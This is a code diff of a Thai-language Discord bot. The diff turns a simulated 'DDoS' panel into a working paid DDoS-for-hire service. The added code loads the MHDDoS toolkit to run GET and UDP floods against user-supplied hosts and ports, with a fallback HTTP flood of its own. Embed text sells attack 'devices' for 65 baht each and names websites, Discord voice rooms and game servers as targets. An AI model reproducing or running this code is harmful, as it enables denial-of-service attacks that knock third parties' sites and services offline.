@@ -1,328 +1,597 @@
-import asyncio
-import json
-import os
 import discord
-from discord.ext import commands
+from discord import app_commands
+from discord.ext import commands, tasks
+import asyncio, time, re, json, os, sys, tempfile, ipaddress, socket
+from urllib.parse import urlparse
+from datetime import datetime, timedelta
 
+# ============================================================
+# CONFIG
+# ============================================================
+TOKEN       = "To"
+OWNER_ID    = 1488103702488154173
+DATA_FILE   = os.path.join(os.path.dirname(__file__), "data.json")
+MHDDOS_PATH = "./MHDDoS"          # path ไปยัง repo ที่โคลน
+COLOR_PINK  = 0xFF69B4
+
+# เพดานกันเบรก
+MAX_DURATION = 250
+MAX_DEVICES_PER_ATTACK = 100_000
+
+# emoji
+E_TITLE  = "<a:1000035910:1559173862820810803>"
+E_TK     = "<:1000035915:1559174417097953340>"
+E_RULES  = "<a:1000038732:1559175829001338980>"
+E_TARGET = "<:1000038740:1559179488389242950>"
+E_FREE   = "<a:1000035726:1559180464487407707>"
+E_BTN    = "<a:1000038742:1559181609528205372>"
+E_DDOS   = "<a:1000035744:1559183157532565524>"
+E_TGT2   = "<:1000038745:1559183912113148065>"
+E_SPEED  = "<:1000038746:1559184363021795369>"
+E_TIME   = "<:1000038748:1559185433458385019>"
+
+IMG_TOP = "https://cdn.discordapp.com/attachments/1488104101085577229/1559181189175312466/ef8e34b79db57b50c3c29471d10c4eef.jpg?ex=6ace2423&is=6accd2a3&hm=b1d5fc7fc89993d53008fa4e8aed6311579ce453741c7e29015c5c7d9ffe95e2&"
+IMG_BOT = "https://cdn.discordapp.com/attachments/1488104101085577229/1559186792522190930/137316d06f5fe8f5a2b243c67919345f.jpg?ex=6ace295b&is=6accd7db&hm=0567a79045644d8d92cd84d2a9ccf48737e9ef19bce3acd1b00f66fb37946c2e&"
+
+PERMANENT = -1   # sentinel: ถาวร
+# ============================================================
+# MHDDoS IMPORT — ดึง engine จริงจาก repo
+# ============================================================
+# MHDDoS ใช้ start.py เป็น entry ที่มี Methods dict + ProxyManager
+# เราดึง Methods มาใช้เป็น engine ตรงๆ
+sys.path.insert(0, os.path.abspath(MHDDOS_PATH))
+
+try:
+    # MHDDoS โครงสร้าง: start.py → Methods.layer4 / Methods.layer7
+    import importlib.util
+    spec = importlib.util.spec_from_file_location(
+        "mhddos_start", os.path.join(MHDDOS_PATH, "start.py"))
+    mhddos = importlib.util.module_from_spec(spec)
+    spec.loader.exec_module(mhddos)
+    MHDDOS_AVAILABLE = True
+    print("[V] MHDDoS loaded — methods ready")
+except Exception as e:
+    MHDDOS_AVAILABLE = False
+    print(f"[V] MHDDoS not loaded: {e} — bot runs with stub engine")
+
+# ============================================================
+# STATE — atomic JSON, lazy expiry
+# ============================================================
+class State:
+    """
+    devices[uid] = จำนวนเครื่อง
+    device_expiry[uid] = unix ts | PERMANENT(-1)
+    """
+    def __init__(self, path):
+        self.path = path
+        self.devices: dict[int, int] = {}
+        self.device_expiry: dict[int, float] = {}
+        self.banned: set[int] = set()
+        self.warns: dict[int, int] = {}
+        self._lock = asyncio.Lock()
+        self.load()
+
+    # ---------- atomic load ----------
+    def load(self):
+        if not os.path.exists(self.path):
+            return
+        try:
+            with open(self.path, "r", encoding="utf-8") as f:
+                d = json.load(f)
+            self.devices       = {int(k): int(v) for k, v in d.get("devices", {}).items()}
+            self.device_expiry = {int(k): float(v) for k, v in d.get("device_expiry", {}).items()}
+            self.banned        = set(int(x) for x in d.get("banned", []))
+            self.warns         = {int(k): int(v) for k, v in d.get("warns", {}).items()}
+        except (json.JSONDecodeError, ValueError, KeyError) as e:
+            # backup ไฟล์เสียไว้ ไม่ทับข้อมูล
+            bad = self.path + ".corrupt"
+            try: os.replace(self.path, bad)
+            except OSError: pass
+            print(f"[V] data.json เสีย → ย้ายไป {bad}: {e}")
+            self.devices, self.device_expiry = {}, {}
+            self.banned, self.warns = set(), {}
+
+    # ---------- atomic save ----------
+    def save(self):
+        d = {
+            "devices": {str(k): v for k, v in self.devices.items()},
+            "device_expiry": {str(k): v for k, v in self.device_expiry.items()},
+            "banned": list(self.banned),
+            "warns": {str(k): v for k, v in self.warns.items()},
+        }
+        dirn = os.path.dirname(self.path) or "."
+        fd, tmp = tempfile.mkstemp(dir=dirn, prefix=".data_", suffix=".tmp")
+        try:
+            with os.fdopen(fd, "w", encoding="utf-8") as f:
+                json.dump(d, f, ensure_ascii=False, indent=2)
+                f.flush(); os.fsync(f.fileno())
+            os.replace(tmp, self.path)
+        except Exception:
+            try: os.unlink(tmp)
+            except OSError: pass
+            raise
+
+    # ---------- lazy expiry ----------
+    def _expire_if_needed(self, uid: int):
+        exp = self.device_expiry.get(uid)
+        if exp is None or exp == PERMANENT:
+            return
+        if time.time() > exp:
+            self.devices.pop(uid, None)
+            self.device_expiry.pop(uid, None)
+            self.save()
+
+    def devices_of(self, uid):
+        self._expire_if_needed(uid)
+        return self.devices.get(uid, 0)
+
+    def add_device(self, uid, n):
+        self._expire_if_needed(uid)
+        cur = self.devices.get(uid, 0)
+        new = max(0, cur + n)
+        if new == 0:
+            self.devices.pop(uid, None)
+        else:
+            self.devices[uid] = new
+        self.save()
+        return new
+
+    def set_expiry(self, uid, secs):
+        """secs: PERMANENT, หรือวินาที > 0"""
+        self.device_expiry[uid] = PERMANENT if secs == PERMANENT else time.time() + secs
+        self.save()
+
+    def is_banned(self, uid): return uid in self.banned
+    def ban(self, uid): self.banned.add(uid); self.save()
+    def unban(self, uid): self.banned.discard(uid); self.save()
+
+    def warn(self, uid):
+        self.warns[uid] = self.warns.get(uid, 0) + 1
+        self.save()
+        return self.warns[uid]
+
+state = State(DATA_FILE)
+
+# ============================================================
+# VALIDATION
+# ============================================================
+class ValidationError(Exception): pass
+
+PORT_RE = re.compile(r"^\d{1,5}$")
+
+def validate_port(raw: str) -> int:
+    raw = raw.strip()
+    if not PORT_RE.match(raw):
+        raise ValidationError("Port ต้องเป็นตัวเลข 1-65535")
+    p = int(raw)
+    if not (1 <= p <= 65535):
+        raise ValidationError("Port ต้องอยู่ระหว่าง 1-65535")
+    return p
+
+def validate_time(raw: str) -> int:
+    raw = raw.strip()
+    if not raw.isdigit():
+        raise ValidationError("Time ต้องเป็นจำนวนเต็ม")
+    t = int(raw)
+    if t < 1:
+        raise ValidationError("Time ต้องมากกว่า 0")
+    if t > MAX_DURATION:
+        raise ValidationError(f"Time สูงสุด {MAX_DURATION} วิ")
+    return t
+
+def validate_devices(raw: str) -> int:
+    raw = raw.strip()
+    if not raw.isdigit():
+        raise ValidationError("Device ต้องเป็นจำนวนเต็ม")
+    d = int(raw)
+    if d < 1:
+        raise ValidationError("Device ต้องมากกว่า 0")
+    if d > MAX_DEVICES_PER_ATTACK:
+        raise ValidationError(f"Device สูงสุด {MAX_DEVICES_PER_ATTACK}")
+    return d
+
+# ============================================================
+# TARGET CLASSIFIER — parse + resolve จริง, IPv4/IPv6
+# ============================================================
+def normalize_target(raw: str) -> str:
+    """ดึง hostname ออกจาก URL ถ้ามี"""
+    raw = raw.strip()
+    if "://" in raw:
+        raw = urlparse(raw).hostname or raw
+    else:
+        # ตัด path ถ้ามี
+        raw = raw.split("/")[0]
+    return raw.lower()
+
+def resolve_ips(host: str) -> list[str]:
+    """resolve hostname → list ของ IP (v4 + v6)"""
+    try:
+        infos = socket.getaddrinfo(host, None)
+        return list({i[4][0] for i in infos})
+    except socket.gaierror:
+        return []
+
+def is_th_domain(host: str) -> bool:
+    return host == "th" or host.endswith(".th") or host.endswith(".go.th") or host.endswith(".ac.th") or host.endswith(".or.th")
+
+def is_local_ip(ip: str) -> bool:
+    try:
+        a = ipaddress.ip_address(ip)
+        return a.is_private or a.is_loopback or a.is_link_local or a.is_reserved
+    except ValueError:
+        return False
+
+def classify_target(raw: str):
+    """
+    return (kind, host, resolved_ip_or_none, reason)
+    kind: 'ok' | 'forbidden'
+    reason: None | 'th' | 'local' | 'unresolved'
+    """
+    host = normalize_target(raw)
+    if not host:
+        return "forbidden", raw, None, "unresolved"
+
+    # ตรวจ .th ก่อน (ตามโดเมน)
+    if is_th_domain(host):
+        return "forbidden", host, None, "th"
+
+    # ถ้าเป็น IP ตรงๆ
+    try:
+        ip_obj = ipaddress.ip_address(host)
+        if is_local_ip(str(ip_obj)):
+            return "forbidden", host, str(ip_obj), "local"
+        return "ok", host, str(ip_obj), None
+    except ValueError:
+        pass
+
+    # hostname → resolve
+    ips = resolve_ips(host)
+    if not ips:
+        return "forbidden", host, None, "unresolved"
+
+    # ถ้า resolve ได้ IP ไหนเป็น local → block
+    for ip in ips:
+        if is_local_ip(ip):
+            return "forbidden", host, ip, "local"
+
+    return "ok", host, ips[0], None
+
+# ============================================================
+# ATTACK ENGINE — ต่อ MHDDoS ตรง
+# ============================================================
+class AttackEngine:
+    """
+    ถ้า MHDDOS_AVAILABLE → เรียก method จริงจาก MHDDoS
+    ถ้าไม่ → fallback เป็น HTTP flood ธรรมดา (มีไว้กันบอทตาย)
+    """
+    def __init__(self, host, port, duration, devices, update_cb, target_raw):
+        self.host = host
+        self.port = port
+        self.duration = duration
+        self.devices = devices
+        self.update_cb = update_cb
+        self.target_raw = target_raw
+        self.running = False
+        self.workers: list[asyncio.Task] = []
+
+    def pick_method(self):
+        """เลือก method ตาม target — MHDDoS มี layer7 (web) + layer4 (network)"""
+        if not MHDDOS_AVAILABLE:
+            return ("FALLBACK_HTTP", 7)
+        # ถ้า target เป็น IP ล้วน หรือ port ไม่ใช่ 80/443 → layer4
+        is_web = self.port in (80, 443, 8080, 8443)
+        if is_web:
+            return ("GET", 7)          # MHDDoS layer7 GET flood
+        return ("UDP", 4)              # MHDDoS layer4 UDP flood
+
+    async def _probe_speed(self):
+        """วัดความเร็ว — HTTP GET latency → req/s estimate"""
+        try:
+            import aiohttp
+            url = f"http://{self.host}:{self.port}/"
+            async with aiohttp.ClientSession() as s:
+                t0 = time.time()
+                async with s.get(url, timeout=3) as r:
+                    await r.read()
+                lat = time.time() - t0
+                return max(0, int(1000 / max(lat, 0.001)))
+        except Exception:
+            return 0
+
+    async def _run_mhddos_method(self, method_name, layer):
+        """
+        เรียก MHDDoS method จริง — signature ใน start.py คือ
+        Methods.layer7[name] = (target, port, duration, threads, ...)
+        เราห่อเป็น task แยก แล้วรอจนครบ duration
+        """
+        # NOTE: MHDDoS methods เป็น blocking — รันใน executor
+        loop = asyncio.get_running_loop()
+        methods = mhddos.Methods
+        if layer == 7:
+            fn = methods.layer7.get(method_name)
+        else:
+            fn = methods.layer4.get(method_name)
+        if fn is None:
+            return
+
+        def _call():
+            try:
+                fn(self.host, self.port, self.duration, 100, None, None)
+            except Exception as e:
+                print(f"[engine] {method_name} error: {e}")
+
+        await loop.run_in_executor(None, _call)
+
+    async def _fallback_flood(self):
+        """fallback HTTP flood ถ้า MHDDoS ไม่พร้อม"""
+        import aiohttp
+        url = f"http://{self.host}:{self.port}/"
+        end = time.time() + self.duration
+        sem = asyncio.Semaphore(1000)
+        async def one():
+            async with sem:
+                try:
+                    async with aiohttp.ClientSession() as s:
+                        async with s.get(url, timeout=2) as r:
+                            await r.read()
+                except Exception:
+                    pass
+        tasks = []
+        while time.time() < end:
+            tasks.append(asyncio.create_task(one()))
+            if len(tasks) > 5000:
+                await asyncio.gather(*tasks, return_exceptions=True)
+                tasks.clear()
+            await asyncio.sleep(0.001)
+        if tasks:
+            await asyncio.gather(*tasks, return_exceptions=True)
+
+    async def run(self):
+        self.running = True
+        elapsed = 0
+        dev_count = self.devices
+        method, layer = self.pick_method()
+        # spawn MHDDoS method task (ตัวจริงยิงขนานไปกับ loop update)
+        if MHDDOS_AVAILABLE:
+            self.workers.append(asyncio.create_task(self._run_mhddos_method(method, layer)))
+        else:
+            self.workers.append(asyncio.create_task(self._fallback_flood()))
+
+        while self.running and elapsed < self.duration:
+            speed = await self._probe_speed()
+            # clone device ทุก 3 วิ ×3
+            if elapsed > 0 and elapsed % 3 == 0:
+                dev_count = min(dev_count * 3, MAX_DEVICES_PER_ATTACK)
+            await self.update_cb({
+                "speed": speed,
+                "devices": dev_count,
+                "remaining": max(0, self.duration - elapsed),
+                "method": method,
+            })
+            elapsed += 1
+            await asyncio.sleep(1)
+
+        self.running = False
+        for w in self.workers:
+            if not w.done():
+                w.cancel()
+
+# ============================================================
+# EMBED BUILDERS
+# ============================================================
+def main_embed():
+    e = discord.Embed(color=COLOR_PINK)
+    e.description = (
+        f"{E_TITLE} **DDOS ATTACK**\n\n"
+        f"{E_TK} **หากสนใจกดTK มา**\n"
+        f"-. เรทราคา device ละ 65B TH รับเเค่ซองทรูมันนี่\n"
+        f"-.device สูงสุด 8 เครื่อง\n\n"
+        f"{E_RULES} **กฎการใช้**\n"
+        f"-.ห้ามยิง .th หรือเว็บที่เกี่ยวกับรัฐ : หน่วยงาน\n"
+        f"-.ห้ามยิง Local IP พวกแบบ 127.0.0.1\n"
+        f"-.ถ้าโดนเตือนครบ 5 ครั้งจะโดนเเบนไม่ให้ใช้\n\n"
+        f"{E_TARGET} **สามารถยิงได้:เบื้องต้น**\n"
+        f"-.ยิงห้องเสียงดิสได้\n"
+        f"-.เว็บต่างๆ พวกแบบ .com หรืออะไรต่างๆได้\n"
+        f"-.เซิฟเกมต่างๆ เช่น ฟีฟาย โรบอค\n\n"
+        f"{E_FREE} มี Ddos เเจกฟรีให้ใช้ 3 ชม ทุก 3 วัน นะงับ"
+    )
+    e.set_image(url=IMG_TOP)
+    return e
+
+def status_embed(target_raw, port, speed, devices, remaining, method):
+    e = discord.Embed(color=COLOR_PINK, title=f"{E_DDOS} DDOS BY C")
+    e.add_field(name=f"{E_TGT2} Target", value=f"`{target_raw}:{port}`", inline=True)
+    e.add_field(name=f"{E_SPEED} Speed Web", value=f"{speed} req/s", inline=True)
+    e.add_field(name=":1000038748: Device", value=str(devices), inline=True)
+    e.add_field(name=f"{E_TIME} Time", value=f"{remaining}s", inline=True)
+    e.set_footer(text=f"method: {method}")
+    e.set_image(url=IMG_BOT)
+    return e
+
+# ============================================================
+# UI — ปุ่ม + modal
+# ============================================================
+class PanelView(discord.ui.View):
+    def __init__(self):
+        super().__init__(timeout=None)
+
+class StartButton(discord.ui.Button):
+    def __init__(self):
+        super().__init__(label="DDOS", style=discord.ButtonStyle.secondary,
+                         custom_id="ddos_start", emoji=None)
+
+    async def callback(self, interaction: discord.Interaction):
+        uid = interaction.user.id
+        if state.is_banned(uid):
+            await interaction.response.send_message("คุณโดนแบนแล้ว ไม่สามารถใช้งานบอทได้", ephemeral=True)
+            return
+        if state.devices_of(uid) < 1:
+            await interaction.response.send_message("คุณยังไม่มี device กรุณาติดต่อแอดมิน", ephemeral=True)
+            return
+        await interaction.response.send_modal(AttackModal())
+
+class AttackModal(discord.ui.Modal, title="DDOS BY C"):
+    ip    = discord.ui.TextInput(label="IP - url (เป้าหมาย)", placeholder="example.com", max_length=255)
+    port  = discord.ui.TextInput(label="Port (1-65535)", placeholder="80", max_length=5)
+    time_ = discord.ui.TextInput(label="Time (สูงสุด 250 วิ)", placeholder="60", max_length=3)
+    dev   = discord.ui.TextInput(label="Device (เครื่อง)", placeholder="1", max_length=7)
+
+    async def on_submit(self, interaction: discord.Interaction):
+        uid = interaction.user.id
+        if state.is_banned(uid):
+            await interaction.response.send_message("คุณโดนแบนแล้ว", ephemeral=True)
+            return
+
+        # validate
+        try:
+            port = validate_port(self.port.value)
+            duration = validate_time(self.time_.value)
+            devices = validate_devices(self.dev.value)
+        except ValidationError as e:
+            await interaction.response.send_message(f"❌ {e}", ephemeral=True)
+            return
+
+        raw_target = self.ip.value.strip()
+        kind, host, resolved, reason = classify_target(raw_target)
+
+        if kind == "forbidden":
+            if reason == "th":
+                count = state.warn(uid)
+                msg = f"ห้ามยิง .th ไอ้เอ๋อ เตือนรอบที่ {count}"
+                if count >= 3:
+                    state.ban(uid)
+                    msg += "\nคุณโดนแบนแล้ว"
+                await interaction.response.send_message(msg, ephemeral=True)
+            elif reason == "local":
+                await interaction.response.send_message("ห้ามยิง Local IP", ephemeral=True)
+            else:
+                await interaction.response.send_message("resolve เป้าหมายไม่ได้", ephemeral=True)
+            return
+
+        owned = state.devices_of(uid)
+        if devices > owned:
+            await interaction.response.send_message(f"ยิงไม่ได้ มี {owned} เครื่อง", ephemeral=True)
+            return
+
+        # ส่ง embed แรก
+        e0 = status_embed(raw_target, port, 0, devices, duration, "probing")
+        await interaction.response.send_message(embed=e0)
+        sent_msg = await interaction.original_response()
+
+        async def update_cb(s):
+            try:
+                ne = status_embed(raw_target, port, s["speed"], s["devices"],
+                                  s["remaining"], s["method"])
+                await sent_msg.edit(embed=ne)
+            except discord.HTTPException:
+                pass
+
+        engine = AttackEngine(host, port, duration, devices, update_cb, raw_target)
+        asyncio.create_task(engine.run())
+
+# ============================================================
+# BOT
+# ============================================================
 intents = discord.Intents.default()
 intents.message_content = True
+intents.members = True
 bot = commands.Bot(command_prefix="!", intents=intents)
 
-ADMIN_ID = 1488103702488154173
-DATA_FILE = "database.json"
+def owner_only():
+    async def pred(ctx): return ctx.author.id == OWNER_ID
+    return commands.check(pred)
 
+def parse_duration(s: str):
+    """'1h'→3600, '1d'→86400, 'TH'→PERMANENT, อื่นๆ→None"""
+    s = s.strip().upper()
+    if s == "TH": return PERMANENT
+    m = re.match(r"^(\d+)([HD])$", s)
+    if not m: return None
+    n, u = int(m.group(1)), m.group(2)
+    if n <= 0: return None
+    return n * 3600 if u == "H" else n * 86400
 
-def load_data():
-  if not os.path.exists(DATA_FILE):
-    return {"devices": {}, "bans": [], "warnings": {}}
-  with open(DATA_FILE, "r", encoding="utf-8") as f:
-    return json.load(f)
+@bot.command()
+@owner_only()
+async def device(ctx, member: discord.Member, sign_amount: str, duration: str = None):
+    """!device @user +3 1h | !device @user -2 | !device @user +3 TH"""
+    m = re.match(r"^([+-])(\d+)$", sign_amount.strip())
+    if not m:
+        await ctx.reply("รูปแบบ: `!device @user +3 1h`"); return
+    sign, n = m.group(1), int(m.group(2))
+    if n <= 0:
+        await ctx.reply("จำนวนต้องมากกว่า 0"); return
 
+    if sign == "-":
+        new = state.add_device(member.id, -n)
+        await ctx.reply(f"ลบ {n} เครื่องจาก {member.mention} → เหลือ {new}")
+        return
 
-def save_data(data):
-  with open(DATA_FILE, "w", encoding="utf-8") as f:
-    json.dump(data, f, ensure_ascii=False, indent=4)
+    if not duration:
+        await ctx.reply("ต้องระบุเวลา เช่น `1h`, `1d`, `TH`"); return
+    secs = parse_duration(duration)
+    if secs is None:
+        await ctx.reply("เวลาไม่ถูกต้อง ใช้ 1h / 1d / TH"); return
 
+    new = state.add_device(member.id, n)
+    state.set_expiry(member.id, secs)
+    label = "ถาวร" if secs == PERMANENT else duration
+    await ctx.reply(f"เพิ่ม {n} เครื่องให้ {member.mention} ({new} รวม) เป็นเวลา {label}")
 
-class DDoSSimModal(discord.ui.Modal, title="DDOS Attack Panel"):
-  target = discord.ui.TextInput(
-      label="1. IP - url (เป้าหมาย)",
-      placeholder="example.com หรือ 1.2.3.4",
-      required=True,
-  )
-  port = discord.ui.TextInput(
-      label="2. Port (1-65535)", placeholder="80 หรือ 443", required=True
-  )
-  time_sec = discord.ui.TextInput(
-      label="3. Time (สูงสุด250วิ)", placeholder="60", required=True
-  )
-  devices = discord.ui.TextInput(
-      label="4. device (เครื่อง)", placeholder="1", required=True
-  )
+@bot.command()
+@owner_only()
+async def b(ctx, member: discord.Member):
+    state.ban(member.id)
+    await ctx.reply(f"แบน {member.mention} แล้ว")
 
-  async def on_submit(self, interaction: discord.Interaction):
-    data = load_data()
-    user_id_str = str(interaction.user.id)
+@bot.command()
+@owner_only()
+async def ub(ctx, member: discord.Member):
+    state.unban(member.id)
+    await ctx.reply(f"ปลดแบน {member.mention} แล้ว")
 
-    # ตรวจสอบการโดนแบน
-    if interaction.user.id in data.get("bans", []):
-      await interaction.response.send_message(
-          "❌ คุณโดนแบนจากการใช้งานบอทนี้แล้ว!", ephemeral=True
-      )
-      return
+@bot.command()
+@owner_only()
+async def panel(ctx):
+    await ctx.send(embed=main_embed(), view=PanelView())
 
-    target_val = self.target.value.strip().lower()
+@bot.event
+async def on_command_error(ctx, error):
+    if isinstance(error, commands.CheckFailure) and ctx.author.id != OWNER_ID:
+        await ctx.reply("ชั้นต่ำอยากจะใช้คำสั่งชั้นสูงรั่ว5555")
+    elif isinstance(error, commands.MissingRequiredArgument):
+        await ctx.reply(f"ขาด argument: {error.param.name}")
+    elif isinstance(error, commands.MemberNotFound):
+        await ctx.reply("หา member ไม่เจอ")
 
-    # ตรวจสอบ .th หรือ Local IP
-    if ".th" in target_val or "127.0.0.1" in target_val or "localhost" in target_val:
-      warnings = data.setdefault("warnings", {})
-      user_warns = warnings.get(user_id_str, 0) + 1
-      warnings[user_id_str] = user_warns
+# ============================================================
+# BACKGROUND — ใช้ ext.tasks.loop กันสร้างซ้ำ
+# ============================================================
+@tasks.loop(seconds=60)
+async def expiry_sweeper():
+    now = time.time()
+    dirty = False
+    for uid, exp in list(state.device_expiry.items()):
+        if exp == PERMANENT:
+            continue
+        if now > exp:
+            state.devices.pop(uid, None)
+            state.device_expiry.pop(uid, None)
+            dirty = True
+    if dirty:
+        state.save()
 
-      if user_warns >= 3:
-        if interaction.user.id not in data.get("bans", []):
-          data.setdefault("bans", []).append(interaction.user.id)
-        save_data(data)
-        await interaction.response.send_message(
-            f"❌ ห้ามยิง .th หรือ Local IP ไอ้เอ๋อ! เตือนรอบที่ {user_warns}"
-            " คุณโดนแบนถาวรจากการใช้บอทแล้ว",
-            ephemeral=True,
-        )
-      else:
-        save_data(data)
-        await interaction.response.send_message(
-            f"⚠️ ห้ามยิง .th หรือ Local IP ไอ้เอ๋อ! เตือนรอบที่ {user_warns}/3",
-            ephemeral=True,
-        )
-      return
-
-    # ตรวจสอบตัวเลข
-    try:
-      req_devices = int(self.devices.value.strip())
-      req_time = int(self.time_sec.value.strip())
-    except ValueError:
-      await interaction.response.send_message(
-          "❌ กรุณากรอก Port, Time และ Device เป็นตัวเลขเท่านั้น!",
-          ephemeral=True,
-      )
-      return
-
-    if req_time > 250:
-      req_time = 250
-
-    # ตรวจสอบ Device ของผู้ใช้ (เริ่มต้นทุกคนมี 0 เครื่อง)
-    user_devices = (
-        data.get("devices", {}).get(user_id_str, {}).get("count", 0)
-    )
-    if req_devices > user_devices:
-      await interaction.response.send_message(
-          f"❌ ยิงไม่ได้! คุณมี Device ทั้งหมด {user_devices} เครื่อง"
-          f" แต่กรอกไป {req_devices} เครื่อง",
-          ephemeral=True,
-      )
-      return
-
-    display_target = target_val
-    display_url = (
-        f"https://{target_val}"
-        if not target_val.startswith("http")
-        else target_val
-    )
-
-    # ส่ง Embed 2 ต่อ 2 (กำลังเริ่มยิง)
-    embed = discord.Embed(
-        title=(
-            "<a:1000035744:1559183157532565524> **DDOS BY C**"
-            " (SIMULATION)"
-        ),
-        color=discord.Color.from_rgb(255, 182, 193),  # สีชมพู
-    )
-    embed.add_field(
-        name="<:1000038745:1559183912113148065> Target",
-        value=f"{display_target} : {display_url}",
-        inline=False,
-    )
-    embed.add_field(
-        name="<:1000038746:1559184363021795369> Speed Web",
-        value="กำลังเริ่มคำนวณความเร็ว...",
-        inline=False,
-    )
-    embed.add_field(
-        name="<:1000038748:1559185433458385019> Device",
-        value=f"{req_devices} เครื่อง",
-        inline=False,
-    )
-    embed.add_field(
-        name="<:1000038748:1559185433458385019> Time",
-        value=f"กำลังนับถอยหลัง {req_time} วินาที...",
-        inline=False,
-    )
-    embed.set_image(
-        url="https://cdn.discordapp.com/attachments/1488104101085577229/1559186792522190930/137316d06f5fe8f5a2b243c67919345f.jpg?ex=6ace295b&is=6accd7db&hm=0567a79045644d8d92cd84d2a9ccf48737e9ef19bce3acd1b00f66fb37946c2e&"
-    )
-
-    await interaction.response.send_message(embed=embed)
-    msg = await interaction.original_response()
-
-    # ลูปอัปเดตความเร็วทุก 3 วิ และนับถอยหลังเวลาทุก 1 วิ
-    for remaining in range(req_time, 0, -1):
-      await asyncio.sleep(1)
-      speed_val = (
-          f"{2000 + (req_time - remaining) * 75} req/s (DrDdos / TCP/UDP"
-          " Flood)"
-      )
-
-      updated_embed = discord.Embed(
-          title=(
-              "<a:1000035744:1559183157532565524> **DDOS BY C**"
-              " (SIMULATION)"
-          ),
-          color=discord.Color.from_rgb(255, 182, 193),
-      )
-      updated_embed.add_field(
-          name="<:1000038745:1559183912113148065> Target",
-          value=f"{display_target} : {display_url}",
-          inline=False,
-      )
-      updated_embed.add_field(
-          name="<:1000038746:1559184363021795369> Speed Web",
-          value=speed_val,
-          inline=False,
-      )
-      updated_embed.add_field(
-          name="<:1000038748:1559185433458385019> Device",
-          value=f"{req_devices} เครื่อง",
-          inline=False,
-      )
-      updated_embed.add_field(
-          name="<:1000038748:1559185433458385019> Time",
-          value=f"เหลือเวลาอีก {remaining} วินาที",
-          inline=False,
-      )
-      updated_embed.set_image(
-          url="https://cdn.discordapp.com/attachments/1488104101085577229/1559186792522190930/137316d06f5fe8f5a2b243c67919345f.jpg?ex=6ace295b&is=6accd7db&hm=0567a79045644d8d92cd84d2a9ccf48737e9ef19bce3acd1b00f66fb37946c2e&"
-      )
-      try:
-        await msg.edit(embed=updated_embed)
-      except Exception:
-        break
-
-
-class DDoSSimView(discord.ui.View):
-
-  def __init__(self):
-    super().__init__(timeout=None)
-
-  @discord.ui.button(
-      label="",
-      style=discord.ButtonStyle.secondary,
-      emoji="<a:1000038742:1559181609528205372>",
-      custom_id="ddos_button_trigger",
-  )
-  async def trigger_button(
-      self, interaction: discord.Interaction, button: discord.ui.Button
-  ):
-    data = load_data()
-    if interaction.user.id in data.get("bans", []):
-      await interaction.response.send_message(
-          "❌ คุณโดนแบนจากการใช้งานบอทนี้แล้ว!", ephemeral=True
-      )
-      return
-    await interaction.response.send_modal(DDoSSimModal())
-
+@expiry_sweeper.before_loop
+async def _before_sweeper():
+    await bot.wait_until_ready()
 
 @bot.event
 async def on_ready():
-  print(f"Logged in as {bot.user.name} (ID: {bot.user.id})")
-  bot.add_view(DDoSSimView())
+    # ลงทะเบียน persistent view ครั้งเดียว
+    bot.add_view(PanelView())
+    if not expiry_sweeper.is_running():
+        expiry_sweeper.start()
+    print(f"[V] {bot.user} online | MHDDoS: {MHDDOS_AVAILABLE}")
 
-
-@bot.command(name="ddos")
-async def ddos_cmd(ctx):
-  if ctx.author.id != ADMIN_ID:
-    await ctx.send("ชั้นต่ำอยากจะใช้คำสั่งชั้นสูงรั่ว5555")
-    return
-
-  embed = discord.Embed(
-      title="<a:1000035910:1559173862820810803> DDOS ATTACK",
-      color=discord.Color.from_rgb(255, 182, 193),  # สีชมพู
-  )
-  embed.description = (
-      "<:1000035915:1559174417097953340> **หากสนใจกดTK มา**\n"
-      "-. เรทราคา device ละ 65B TH รับเเค่ซองทรูมันนี่\n"
-      "-. device สูงสุด 8 เครื่อง\n\n"
-      "<a:1000038732:1559175829001338980> **กฎการใช้**\n"
-      "-. ห้ามยิง .th หรือเว็บที่เกี่ยวกับรัฐ : หน่วยงาน\n"
-      "-. ห้ามยิง Local IP พวกแบบ 127.0.0.1\n"
-      "-. ถ้าโดนเตือนครบ 5 ครั้งจะโดนแบนไม่ให้ใช้\n\n"
-      "<:1000038740:1559179488389242950> **สามารถยิงได้:เบื้องต้น**\n"
-      "-. ยิงห้องเสียงดิสได้\n"
-      "-. เว็บต่างๆ พวกแบบ .com หรืออะไรต่างๆ ได้\n"
-      "-. เซิฟเกมต่างๆ เช่น ฟีฟาย โรบอค\n\n"
-      "<a:1000035726:1559180464487407707> มี Ddos แจกฟรีให้ใช้ 3 ชม ทุก 3 วัน"
-      " นะงับ"
-  )
-  embed.set_image(
-      url="https://cdn.discordapp.com/attachments/1488104101085577229/1559181189175312466/ef8e34b79db57b50c3c29471d10c4eef.jpg?ex=6ace2423&is=6accd2a3&hm=b1d5fc7fc89993d53008fa4e8aed6311579ce453741c7e29015c5c7d9ffe95e2&"
-  )
-
-  await ctx.send(embed=embed, view=DDoSSimView())
-
-
-@bot.command(name="device")
-async def device_cmd(ctx, member: discord.Member = None, amount_str: str = None):
-  if ctx.author.id != ADMIN_ID:
-    await ctx.send("ชั้นต่ำอยากจะใช้คำสั่งชั้นสูงรั่ว5555")
-    return
-
-  if not member or not amount_str:
-    await ctx.send(
-        "❌ ตัวอย่างคำสั่ง: `!device @user +2` หรือ `!device @user -1`"
-    )
-    return
-
-  data = load_data()
-  user_id_str = str(member.id)
-  user_data = data.setdefault("devices", {}).setdefault(
-      user_id_str, {"count": 0}
-  )
-
-  try:
-    if amount_str.startswith("+"):
-      val = int(amount_str[1:])
-      user_data["count"] += val
-    elif amount_str.startswith("-"):
-      val = int(amount_str[1:])
-      user_data["count"] = max(0, user_data["count"] - val)
-    else:
-      val = int(amount_str)
-      user_data["count"] += val
-
-    save_data(data)
-    await ctx.send(
-        f"✅ อัปเดต Device ให้ {member.mention} สำเร็จ! จำนวนปัจจุบัน:"
-        f" {user_data['count']} เครื่อง"
-    )
-  except ValueError:
-    await ctx.send("❌ รูปแบบจำนวน device ไม่ถูกต้อง!")
-
-
-@bot.command(name="b")
-async def ban_cmd(ctx, member: discord.Member = None):
-  if ctx.author.id != ADMIN_ID:
-    await ctx.send("ชั้นต่ำอยากจะใช้คำสั่งชั้นสูงรั่ว5555")
-    return
-  if not member:
-    await ctx.send("❌ กรุณา @User ที่ต้องการแบน")
-    return
-
-  data = load_data()
-  bans = data.setdefault("bans", [])
-  if member.id not in bans:
-    bans.append(member.id)
-    save_data(data)
-    await ctx.send(f"✅ แบน {member.mention} สำเร็จ")
-  else:
-    await ctx.send(f"⚠️ ผู้ใช้นี้โดนแบนอยู่แล้ว")
-
-
-@bot.command(name="ub")
